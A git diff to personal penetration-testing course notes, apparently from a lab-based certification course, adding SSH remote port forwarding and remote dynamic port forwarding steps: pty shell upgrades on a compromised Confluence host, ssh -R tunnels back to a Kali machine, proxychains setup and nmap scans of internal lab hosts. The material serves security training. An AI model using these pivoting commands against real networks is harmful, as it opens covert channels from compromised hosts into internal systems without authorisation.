@@ -1565,6 +1565,18 @@ Reference
   - query data
     'SELECT * FROM payroll;'
 - SSH Tunneling (remote dynamic port forward)
+  - Remote dynamic port forwarding is just another instance of dynamic port forwarding, so we gain all the flexibility of traditional dynamic port forwarding. We can connect to any port on any host that CONFLUENCE01 has access to by passing SOCKS-formatted packets.
+  - we pass only one socket: the socket we want to listen on the SSH server
+  - Kali: 192.168.45.233, DB:10.4.133.215, MULTISERVER03: 192.168.133.64
+  - SSH with the remote dynamic port forward  
+    ```
+    confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+    ssh -N -R 9998 kali@192.168.45.233
+    ```
+  - Edit proxychains config to point to new SOCKS proxy on port 9998  
+    `nano /etc/proxychains4.conf` `socks5 127.0.0.1 9998`
+  - Scanning MULTISERVER03 through the remote dynamic SOCKS port with Proxychains > 80, 135, 3389  
+    `proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.133.64` (change to internal server 10.4.xxx.64)
 - sshuttle
 ### 20. Tunneling through deep packet inspectation
 ### 21. The metassploit framework
@@ -2757,7 +2769,23 @@ Reference
       proxychains ./ssh_dynamic_client -i 172.16.114.217 -p 4872
       ```
   - SSH remote port forwarding
-  - SSH remote dynamic port forwarding 
+      ```
+      python3 -c 'import pty; pty.spawn("/bin/sh")'
+      ssh -N -R 127.0.0.1:4444:10.4.114.215:4444 kali@192.168.45.250
+      ./ssh_remote_client -i 192.168.114.63 -p 4444
+      ```
+  - SSH remote dynamic port forwarding  
+    ```
+    python3 -c 'import pty; pty.spawn("/bin/sh")'
+    ssh -N -R 9998 kali@192.168.45.233
+
+    sudo nano /etc/proxychains4.conf
+    #socks5 127.0.0.1 9998
+
+    sudo proxychains nmap -vvv -sT -p 9050-9100 -Pn 10.4.133.64 > found port 9062
+
+    proxychains ./ssh_remote_dynamic_client -i 10.4.133.64 -p 9062
+    ```
 - Port forward with window tools  
 
 ## Penetration testing report 
